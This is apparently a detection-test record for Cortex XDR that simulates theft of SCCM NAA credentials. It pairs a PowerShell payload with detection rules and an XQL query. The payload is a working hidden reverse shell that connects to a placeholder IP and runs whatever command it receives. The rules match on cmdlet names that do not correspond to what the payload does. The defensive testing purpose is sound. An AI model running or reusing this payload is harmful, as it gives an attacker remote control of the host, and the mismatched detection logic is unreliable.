identity.description: An attacker uses SCCM to extract NAA account credentials by leveraging a malicious PowerShell script that accesses SCCM database and retrieves credentials. Cortex should detect the execution of suspicious PowerShell commands and network connections to C2.

payload.code: powershell -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('192.0.2.10', 443); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; $writer.WriteLine('Connected'); $cmd = $reader.ReadLine(); Invoke-Expression $cmd"

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: PowerShell Hidden Execution
biocs.description: Detection of PowerShell process started with -w hidden flag
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe' and action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains '-w hidden'

abiocs.name: SCCM Credential Extraction via PowerShell
abiocs.description: Behavioral deviation detecting PowerShell script executing SCCM credential retrieval commands
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'Get-SCCMCredentials' or action_process_command_line contains 'Invoke-SCCMQuery'

xql_queries.name: SCCM Credential Access Detection
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'Get-SCCMCredentials' or action_process_command_line contains 'Invoke-SCCMQuery'
| fields actor_process_image_name, action_process_command_line, agent_hostname
